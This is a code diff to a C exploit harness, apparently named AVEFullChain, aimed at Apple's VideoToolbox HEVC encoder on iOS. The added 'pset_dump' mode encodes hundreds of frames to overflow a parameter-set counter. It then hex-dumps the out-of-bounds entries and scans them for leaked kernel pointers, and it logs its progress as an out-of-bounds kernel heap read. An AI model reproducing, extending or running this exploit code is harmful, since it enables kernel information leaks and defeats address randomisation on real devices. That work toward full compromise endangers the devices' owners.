@@ -58,6 +58,7 @@ static volatile OSStatus g_cb_status = -999;
 static volatile int g_cb_count = 0;
 static volatile size_t g_last_pset_count = 0;
 static volatile size_t g_last_pset_total_bytes = 0;
+static CMFormatDescriptionRef g_saved_fmt = NULL; /* retained fmt desc from last callback */
 
 static void rlog(const char *fmt, ...) {
     va_list ap;
@@ -92,6 +93,53 @@ static void encode_cb(void *ctx, void *src, OSStatus status,
                 total += sz;
             }
             g_last_pset_total_bytes = total;
+
+            if (g_saved_fmt) CFRelease(g_saved_fmt);
+            g_saved_fmt = (CMFormatDescriptionRef)CFRetain(fmt);
+        }
+    }
+}
+
+static void dump_psets(CMFormatDescriptionRef fmt, size_t baseline) {
+    if (!fmt) { rlog("No format description available\n"); return; }
+    size_t count = 0;
+    CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, NULL, NULL, &count, NULL);
+    rlog("Total parameter sets: %zu (baseline: %zu)\n\n", count, baseline);
+
+    for (size_t i = 0; i < count && i < 500; i++) {
+        const uint8_t *ptr = NULL;
+        size_t sz = 0;
+        int nal_hdr = 0;
+        OSStatus st = CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
+            fmt, i, &ptr, &sz, NULL, &nal_hdr);
+        if (st != 0) {
+            rlog("  [%zu] ERROR: %d\n", i, (int)st);
+            continue;
+        }
+        const char *label = (i < baseline) ? "" : " *** OOB ***";
+        rlog("  [%zu] nal_hdr=%d size=%zu%s\n", i, nal_hdr, sz, label);
+
+        if (ptr && sz > 0) {
+            size_t dump_len = (sz > 256) ? 256 : sz;
+            rlog("    ");
+            for (size_t j = 0; j < dump_len; j++) {
+                rlog("%02x", ptr[j]);
+                if ((j + 1) % 32 == 0) rlog("\n    ");
+                else if ((j + 1) % 8 == 0) rlog(" ");
+            }
+            if (dump_len < sz) rlog("... (%zu more bytes)", sz - dump_len);
+            rlog("\n");
+
+            /* Scan for kernel pointer patterns: 0xfffffe00XXXXXXXX */
+            if (sz >= 8) {
+                for (size_t j = 0; j <= sz - 8; j += 4) {
+                    uint64_t qw = *(const uint64_t *)(ptr + j);
+                    if ((qw >> 40) == 0xfffffe) {
+                        rlog("    *** KERNEL PTR at byte %zu: 0x%016llx ***\n",
+                             j, (unsigned long long)qw);
+                    }
+                }
+            }
         }
     }
 }
@@ -898,43 +946,48 @@ int main(int argc, char *argv[]) {
     } else if (strcmp(mode, "pset_dump") == 0) {
         rlog("PSET_DUMP: Dump raw parameter set bytes after overflow\n");
         rlog("After counter inflation, CMVideoFormatDescriptionGetHEVCParameterSetAtIndex\n");
-        rlog("reads OOB entries. We dump the raw bytes to look for kernel pointers.\n\n");
+        rlog("reads OOB entries. We hex-dump all bytes to find kernel pointers.\n");
+        rlog("Kernel pointer pattern on A20 iOS 27.1: 0xfffffe00XXXXXXXX\n\n");
         int encodes = (argc > 2) ? atoi(argv[2]) : 300;
         if (phase1_verify() != 0) goto done;
 
         VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
         if (!s) goto done;
 
+        /* Record baseline pset count before overflow */
+        encode_one(s, 0, 128, 128);
+        size_t baseline_count = g_last_pset_count;
+        rlog("Baseline pset_count: %zu\n", baseline_count);
+
         rlog("Encoding %d frames to inflate counter...\n", encodes);
-        for (int i = 0; i < encodes; i++) {
+        for (int i = 1; i < encodes; i++) {
             int st = encode_one(s, i, 128, 128);
             if (st != 0 && i < 5) rlog("[%d] Error: %d\n", i, st);
+            if ((i+1) % 50 == 0)
+                rlog("[%d/%d] psets=%zu bytes=%zu\n",
+                     i+1, encodes, g_last_pset_count, g_last_pset_total_bytes);
         }
         VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
         usleep(500000);
 
-        rlog("\nFinal encode to get OOB parameter sets...\n");
-        int st = encode_one(s, encodes, 128, 128);
-        rlog("Status: %d, pset_count=%zu, pset_bytes=%zu\n",
-             st, g_last_pset_count, g_last_pset_total_bytes);
+        /* Final encode — the callback saves g_saved_fmt */
+        rlog("\nFinal encode to capture format description...\n");
+        encode_one(s, encodes, 128, 128);
+        rlog("Post-overflow: pset_count=%zu, pset_bytes=%zu\n",
+             g_last_pset_count, g_last_pset_total_bytes);
 
-        rlog("\nDumping parameter set raw bytes:\n");
-        CMSampleBufferRef last_buf = NULL;
-        // Re-encode to capture buffer in callback
-        g_encode_done = 0;
-        CVPixelBufferRef pb = create_pb(128, 128);
-        if (pb) {
-            CMTime pts = CMTimeMake(encodes+1, 30);
-            CMTime dur = CMTimeMake(1, 30);
-            VTCompressionSessionEncodeFrame(s, pb, pts, dur, NULL, NULL, NULL);
-            for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
-            CVPixelBufferRelease(pb);
-        }
+        /* Dump all parameter sets from the saved format description */
+        rlog("\n--- RAW PARAMETER SET DUMP ---\n");
+        dump_psets(g_saved_fmt, baseline_count);
 
-        rlog("pset_count=%zu after re-encode\n", g_last_pset_count);
-        rlog("If count > baseline (3), extra entries are OOB kernel heap data\n");
+        if (g_last_pset_count > baseline_count)
+            rlog("\n*** %zu EXTRA parameter sets beyond baseline = OOB DATA ***\n",
+                 g_last_pset_count - baseline_count);
+        else
+            rlog("\nNo extra parameter sets detected. OOB read may use different path.\n");
 
         VTCompressionSessionInvalidate(s); CFRelease(s);
+        if (g_saved_fmt) { CFRelease(g_saved_fmt); g_saved_fmt = NULL; }
 
     } else {
         rlog("Usage: AVEFullChain <mode> [args]\n\n");
